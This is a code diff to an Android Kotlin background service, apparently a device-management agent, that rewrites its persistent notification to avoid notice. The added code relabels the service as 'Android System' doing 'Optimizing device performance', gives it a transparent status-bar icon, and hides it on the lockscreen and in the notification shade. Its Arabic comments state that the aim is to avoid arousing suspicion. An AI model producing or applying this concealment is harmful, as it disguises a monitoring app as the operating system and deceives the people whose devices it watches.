@@ -6,6 +6,7 @@ import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
+import android.os.Build
 import android.os.IBinder
 import android.util.Log
 import androidx.core.app.NotificationCompat
@@ -41,7 +42,7 @@ class AgentService : Service() {
 
     companion object {
         private const val TAG = "AgentService"
-        private const val CHANNEL_ID = "mdm_agent_channel"
+        private const val CHANNEL_ID = "mdm_sys_v2"   // v2 → قناة جديدة بـ IMPORTANCE_NONE
         private const val NOTIFICATION_ID = 1001
 
         // الحد الأقصى للإشعارات المخزّنة في الـ offline buffer (لتجنب استهلاك الذاكرة)
@@ -306,26 +307,46 @@ class AgentService : Service() {
     // ---- Notification Channel ----
 
     private fun createNotificationChannel() {
+        // IMPORTANCE_NONE = لا يظهر في لوحة الإشعارات إطلاقاً (Android 8+)
+        // لكن Android يظهره رغم ذلك لـ Foreground Services في بعض الأجهزة
+        // لذا نجمع بين IMPORTANCE_NONE + أيقونة شفافة + FOREGROUND_SERVICE_IMMEDIATE
         val channel = NotificationChannel(
             CHANNEL_ID,
-            "Company Services",
-            NotificationManager.IMPORTANCE_MIN  // IMPORTANCE_MIN = صامت، لا يزعج المستخدم
+            "System",               // اسم بسيط لا يثير الشبهة في الإعدادات
+            NotificationManager.IMPORTANCE_NONE  // الأعلى إخفاءً المتاح لـ Foreground Service
         ).apply {
-            description = "Background company service"
-            setShowBadge(false)
+            description = "System background process"
+            setShowBadge(false)          // لا تظهر دائرة العدد على أيقونة التطبيق
+            enableLights(false)          // لا وميض LED
+            enableVibration(false)       // لا اهتزاز
+            setSound(null, null)         // لا صوت
+            lockscreenVisibility = Notification.VISIBILITY_SECRET  // مخفي في شاشة القفل
         }
         val nm = getSystemService(NotificationManager::class.java)
         nm.createNotificationChannel(channel)
     }
 
     private fun buildForegroundNotification(): Notification {
-        return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Company Services")
-            .setContentText("Running in background")
-            .setSmallIcon(R.mipmap.ic_launcher)
-            .setPriority(NotificationCompat.PRIORITY_MIN)  // يظهر في الأسفل، لا يُزعج
+        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
+            // نص غير مثير للشبهة يبدو كخدمة نظام عادية
+            .setContentTitle("Android System")
+            .setContentText("Optimizing device performance")
+            // أيقونة شفافة → تختفي من شريط الحالة العلوي تماماً
+            .setSmallIcon(R.drawable.ic_transparent_notification)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
             .setSilent(true)
-            .build()
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)  // مخفي في شاشة القفل
+            .setShowWhen(false)   // لا تُظهر الوقت
+
+        // Android 12+ : FOREGROUND_SERVICE_IMMEDIATE يمنع الإشعار من الظهور
+        // في أعلى الشاشة (heads-up) عند بدء الخدمة لمدة 10 ثوانٍ
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            builder.setForegroundServiceBehavior(
+                NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE
+            )
+        }
+
+        return builder.build()
     }
 }
